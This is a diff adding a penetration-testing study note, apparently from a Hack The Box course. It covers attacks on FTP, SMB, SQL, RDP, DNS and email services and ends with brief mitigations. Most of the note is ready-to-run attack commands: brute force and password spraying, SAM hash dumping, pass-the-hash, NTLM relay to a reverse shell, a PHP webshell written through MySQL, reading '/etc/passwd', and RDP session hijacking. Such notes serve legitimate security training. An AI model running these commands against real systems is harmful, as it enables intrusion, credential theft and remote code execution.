@@ -1,0 +1,115 @@
+# Attacking Common Services
+
+## 🎯 Main Idea
+- Attack the network services most commonly exposed in enterprises: FTP, SMB, SQL (MSSQL/MySQL), RDP, DNS, and email (SMTP/POP3/IMAP).
+- For each service: interact with it, find misconfigurations / excessive privileges / known vulnerabilities, harvest sensitive info and credentials, move laterally, and reach remote code execution.
+- Uses a reusable "Concept of Attacks" model — Source → Process → Privileges → Destination — to analyze any vulnerability or CVE.
+
+## 💥 Attack / Exploit Vectors
+### Foundations: Interacting, Attack Concept & Misconfigurations
+- Interact via CLI/GUI clients; apply the Source→Process→Privileges→Destination model (e.g. Log4Shell CVE-2021-44228 JNDI → RCE).
+- Hunt misconfigurations: default/weak/blank creds, anonymous auth, misconfigured access rights, unnecessary enabled features (OWASP A05).
+- Chain low-value info across services (FTP → email → DB creds → RCE); search shares for cred/password/key/secret files.
+
+### Attacking FTP (TCP/21)
+- Anonymous auth, credential brute force, and FTP Bounce to reach internal hosts.
+- **Commands**
+  - `nmap -sC -sV -p21 <ip>` — Enumerate FTP (ftp-anon, banner/version).
+  - `ftp 192.168.2.142` — Connect with the ftp client.
+  - `nc -v 192.168.2.142 21` — Connect with netcat.
+  - `hydra -l user1 -P /usr/share/wordlists/rockyou.txt ftp://192.168.2.142` — Brute force FTP.
+  - `nmap -b anonymous:password@FTP_IP internal_IP` — FTP Bounce scan of an internal host.
+- Latest: CoreFTP < build 727 — CVE-2022-22836, authenticated path traversal + arbitrary file write (malformed HTTP PUT).
+
+### Attacking SMB (139/445)
+- Null sessions, brute/spray, RCE, SAM dumping, Pass-the-Hash, forced auth and NTLM relay.
+- **Commands**
+  - `smbclient -N -L //10.129.14.128` — Null-session share listing.
+  - `smbmap -H 10.129.14.128` / `-r notes` — Enumerate (recursive) shares with permissions.
+  - `smbmap -H 10.129.14.128 --download "notes\note.txt"` / `--upload test.txt "notes\test.txt"` — Download/upload.
+  - `rpcclient -U'%' 10.10.110.17` — Null session over rpcclient (enumdomusers, change passwords).
+  - `./enum4linux-ng.py 10.10.11.45 -A -C` — Automated SMB enumeration.
+  - `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` — Password spraying.
+  - `impacket-psexec administrator:'Password123!'@10.10.110.17` — RCE via psexec.
+  - `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec` — Command execution.
+  - `crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users` — Enumerate logged-on users.
+  - `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam` — Dump SAM hashes.
+  - `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE` — Pass-the-Hash.
+  - `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146` — NTLM relay to dump SAM.
+  - `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <b64 revshell>'` — Relay to reverse shell.
+- Forced auth: Responder poisons LLMNR/NBT-NS/MDNS to capture NetNTLMv2 hashes (crack with `hashcat -m 5600`).
+- Latest: SMBGhost — CVE-2020-0796, SMBv3.1.1 compression integer overflow, unauthenticated RCE.
+
+### Attacking SQL Databases (MSSQL 1433, MySQL 3306)
+- Connect, enumerate, execute OS commands, read/write files, steal service hashes, impersonate, and pivot via linked servers.
+- **Commands**
+  - `mysql -u julio -pPassword123 -h 10.129.20.13` — Connect to MySQL.
+  - `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` — Connect to MSSQL.
+  - `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` (or `-U .\\julio` for Windows auth) — MSSQL from Linux.
+  - `SHOW DATABASES; USE htbusers; SHOW TABLES; SELECT * FROM users;` — MySQL enumeration.
+  - `SELECT name FROM master.dbo.sysdatabases` / `SELECT * FROM htbusers.INFORMATION_SCHEMA.TABLES` — MSSQL enumeration.
+  - `EXECUTE sp_configure 'show advanced options', 1` → `EXECUTE sp_configure 'xp_cmdshell', 1` → `RECONFIGURE` — Enable xp_cmdshell.
+  - `xp_cmdshell 'whoami'` — Execute an OS command from MSSQL.
+  - `SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` — MySQL file write (webshell).
+  - `show variables like "secure_file_priv";` — Check MySQL file-write privilege.
+  - `SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents` — MSSQL file read.
+  - `select LOAD_FILE("/etc/passwd");` — MySQL file read.
+  - `EXEC master..xp_dirtree '\\10.10.110.17\share\'` / `xp_subdirs` — Steal MSSQL service NetNTLMv2 hash via SMB.
+  - `SELECT srvname, isremote FROM sysservers` — Identify linked servers.
+  - `EXECUTE('select @@servername, ... is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]` — Query a linked server.
+- Also: `EXECUTE AS LOGIN = 'sa'` impersonation; MySQL CVE-2012-2122 auth bypass.
+- Latest: xp_dirtree SMB hash leak of the MSSQL service account (no CVE) for relay/offline cracking.
+
+### Attacking RDP (TCP/3389)
+- Password spraying/guessing, session hijacking, and Pass-the-Hash.
+- **Commands**
+  - `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'` — Password spraying.
+  - `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp` — Brute force RDP.
+  - `rdesktop -u admin -p password123 192.168.2.143` — Connect via rdesktop.
+  - `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}` + `net start sessionhijack` — Hijack a session (as SYSTEM).
+  - `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` — Enable Restricted Admin Mode.
+  - `xfreerdp /v:192.168.2.141 /u:admin /pth:A9FDFA038C4B75EBC76DC855DD74F0DA` — RDP Pass-the-Hash.
+- Latest: BlueKeep — CVE-2019-0708, pre-auth RDP use-after-free RCE as LocalSystem (risk of BSoD).
+
+### Attacking DNS (UDP/TCP 53)
+- Zone transfer, subdomain enumeration, subdomain takeover, and spoofing/cache poisoning.
+- **Commands**
+  - `dig AXFR @ns1.inlanefreight.htb inlanefreight.htb` — Attempt a zone transfer (AXFR).
+  - `subfinder -d inlanefreight.com -v` — Enumerate subdomains.
+  - `host support.inlanefreight.com` — DNS lookup of a subdomain.
+- Also: Fierce/Sublist3r/Subbrute (subdomain enum); Ettercap/Bettercap (DNS spoof/cache poison); can-i-take-over-xyz reference.
+- Latest: Subdomain Takeover — dangling CNAME to an unclaimed third-party resource.
+
+### Attacking Email Services (SMTP 25/465/587, POP3 110/995, IMAP 143/993)
+- Find mail servers, enumerate users, spray/brute force, and abuse open relay.
+- **Commands**
+  - `host -t MX microsoft.com` / `dig mx inlanefreight.com | grep "MX" | grep -v ";"` — Find mail servers.
+  - `host -t A mail1.inlanefreight.htb.` — Resolve a mail host.
+  - `telnet 10.10.110.20 25` — Connect to SMTP (VRFY/EXPN/RCPT enumeration).
+  - `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7` — SMTP user enumeration.
+  - `python3 o365spray.py --validate --domain msplaintext.xyz` — Verify Office365 usage.
+  - `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz` — Enumerate O365 users.
+  - `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz` — Password spray O365.
+  - `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3` — Brute force POP3.
+  - `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213` — Test/abuse open relay.
+- Latest: OpenSMTPD <= 6.6.2 — CVE-2020-7247, unauthenticated RCE via `;` in MAIL FROM (runs as root).
+
+## 🛠️ Key Tools & Concepts
+- smbclient / smbmap / rpcclient / enum4linux-ng — SMB enumeration and null sessions.
+- CrackMapExec (CME) — SMB spraying, RCE, SAM dump, PtH, logged-on users.
+- Impacket (psexec, smbexec, atexec, mssqlclient, ntlmrelayx, smbserver) — RCE, SQL, relay, hash capture.
+- Responder — LLMNR/NBT-NS/MDNS poisoner to steal NetNTLM hashes; hashcat `-m 5600` to crack.
+- Medusa / Hydra / Crowbar — brute force / password spraying (FTP, RDP, email).
+- sqsh / sqlcmd / mysql / mssqlclient — SQL clients; xp_cmdshell / xp_dirtree — MSSQL RCE and hash theft.
+- rdesktop / xfreerdp — RDP clients; tscon.exe / sc.exe — session hijacking and SYSTEM service creation.
+- dig / host / fierce / subfinder — DNS querying, zone transfer, subdomain enum.
+- Ettercap / Bettercap — MITM DNS spoofing; can-i-take-over-xyz — takeover reference.
+- smtp-user-enum / O365spray / swaks — email user enum, spray, open-relay abuse.
+- Concepts: Source→Process→Privileges→Destination, Pass-the-Hash, SMB/NTLM relay, password spraying, null session, open relay, subdomain takeover.
+
+## 🛡️ Mitigations
+- Change default credentials, enforce strong password policies, disable admin/debug interfaces, prevent directory listing.
+- Repeatable hardening, minimal platform (remove unused features/samples), patch management, segmentation (ACLs), security headers, review cloud storage (S3) permissions.
+- Apply least privilege / RBAC; keep patched for SMBGhost (CVE-2020-0796) and BlueKeep (CVE-2019-0708).
+- DNS: restrict who can perform zone transfers; delete CNAME records when third-party services are decommissioned.
+- Email: disable VRFY/EXPN, do not run as an open relay, keep OpenSMTPD patched.
